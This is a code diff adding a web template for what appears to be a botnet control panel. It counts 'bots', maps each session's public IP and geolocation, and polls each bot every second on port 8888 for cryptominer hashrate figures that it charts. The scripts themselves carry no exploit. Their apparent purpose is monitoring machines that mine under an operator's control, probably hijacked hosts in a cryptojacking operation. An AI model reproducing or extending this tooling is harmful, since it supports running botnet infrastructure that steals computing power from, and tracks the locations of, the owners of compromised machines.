+			$('#sessions-table_length').after(`<caption id="sessions-title" align="center" style="position: absolute; float: center; left: 45%; transform: translateY(-18%);"><h3 class="titillium">Bots: <span class="titillium" id="nbots">{{n}}</span></h3></caption>`);
+		});
+
+		$(document).ready(function(){
+			var sessions = $('[id^="session-row"]');
+
+			for (var i = 0; i < sessions.length; i++){
+				// get session uid
+				var session = sessions[i];
+				var uid = session.getAttribute('id').split('-')[2];
+
+				// hide info modals
+				$('#info-modal-' + uid).hide();
+
+				// create peity charts
+				var updatingChart = $("#hashrate-graph-" + uid).peity("line", { width: 150});
+			}
+		});
+
+	</script>
+
+				<script type="text/javascript">
+					jQuery(document).ready(function($)
+					{
+						var map = $("#map-2");
+						
+						map.vectorMap({
+							map: 'world_mill_en',
+							zoomMin: '1',
+							backgroundColor: '#333333',
+							focusOn: { x: 0.3, y: 0.5, scale: 2 },
+						    markers: [
+							    {% for session in sessions %}
+							      {latLng: [ "{{ session['latitude'] }}", "{{ session['longitude'] }}"], name: "{{ session['public_ip'] }}"},
+							    {% endfor %}
+						    ],
+						    markerStyle: {
+						      initial: {
+						        fill: '#ff4e50',
+						        stroke: '#ff4e50',
+							    "stroke-width": 6,
+							    "stroke-opacity": 0.3,
+		    				      }
+						    },	
+							regionStyle: 
+								{
+								  initial: {
+								    fill: '#e9e9e9',
+								    "fill-opacity": 1,
+								    stroke: 'none',
+								    "stroke-width": 0,
+								    "stroke-opacity": 1
+								  },
+								  hover: {
+								    "fill-opacity": 0.8
+								  },
+								  selected: {
+								    fill: 'yellow'
+								  },
+								  selectedHover: {
+								  }
+								}					
+						});
+					});
+				</script>
+
+				<script>
+					// Update hashrate graph and H/s for each bot
+					if($.isFunction($.fn.peity))
+					{
+
+						setInterval(function() 
+							{
+								var table = document.getElementById('sessions-table');
+
+								var sessions = $('[id^="session-row"]');
+
+								for (var i = 0; i < sessions.length; i++){
+									// get session uid
+									var session = sessions[i];
+									var uid = session.getAttribute('id').split('-')[2];
+
+									//var row = table.rows[id];
+									var ip = $('#session-' + uid + '-ip').text();
+
+									var summary = $.ajax({
+										url: `http://` + ip + `:8888/1/summary`,
+										type: 'GET',
+										ajaxUID: uid,
+										success: function(response) {
+											uid = this.ajaxUID;
+											var updatingChart = $("#hashrate-graph-" + uid).peity("line", { width: 150});
+											var hashrate = response['hashrate']['total'][0];
+
+											hashrate = hashrate.toFixed(2);
+											var values = updatingChart.text().split(",");
+											
+											values.shift()
+											values.push(hashrate);
+											
+											updatingChart.text(values.join(",")).change();
+											$("#peity-right-now-" + uid).text(hashrate + ' H/s');
+										},
+										error: function(response, textStatus, errorThrown) {
+											uid = this.ajaxUID;
+											if (textStatus === "timeout") {
+												var updatingChart = $("#hashrate-graph-" + uid).peity("line", { width: 150});
+												var hashrate = 0.0;
+												var values = updatingChart.text().split(",");
+												
+												values.shift()
+												values.push(hashrate);
+												
+												updatingChart.text(values.join(",")).change();
+												$("#peity-right-now-" + uid).text(hashrate + ' H/s');
+											}
+										},
+										timeout: 1000
+									});
+								}
+							}, 1000)
+						}
+				</script>
+{% endblock main %}
